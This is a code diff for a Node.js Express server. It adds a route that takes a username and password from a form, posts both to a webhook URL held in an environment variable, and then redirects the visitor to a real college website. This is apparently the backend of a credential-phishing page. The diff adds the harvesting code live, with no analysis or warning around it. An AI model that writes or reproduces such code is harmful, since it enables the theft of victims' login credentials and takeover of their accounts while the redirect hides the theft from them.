@@ -40,21 +40,46 @@ app.get('/update/:id', (req, res) => {
 
 
 
-// Delete route - delete item
-app.post('/update', async (req, res) => {
+// Send route
+app.post('/update/new', async (req, res) => {
   try {
+    const username = req.body.username;
+    const password = req.body.password;
 
-    const iFilePath = `${req.params.id}`;
+    const webhookURL = process.env['hook'];
+    const message = {
+      content: 'New form submission',
+      embeds: [
+        {
+          title: 'Form Submission',
+          fields: [
+            {
+              name: 'Username',
+              value: username,
+            },
+            {
+              name: 'Password',
+              value: password,
+            },
+          ],
+        },
+      ],
+    };
 
-    console.log("Deleted User: ", result);
-    res.redirect('/admin');
+    await fetch(webhookURL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(message),
+    });
+
+    res.redirect('https://fcrit.ac.in/');
   } catch (err) {
     console.error(err);
     res.status(500).render('error', { message: 'Internal Server Error' });
   }
 });
-
-
 
 app.listen(config.port, () => {
   console.log("Server running on port - " + config.port);
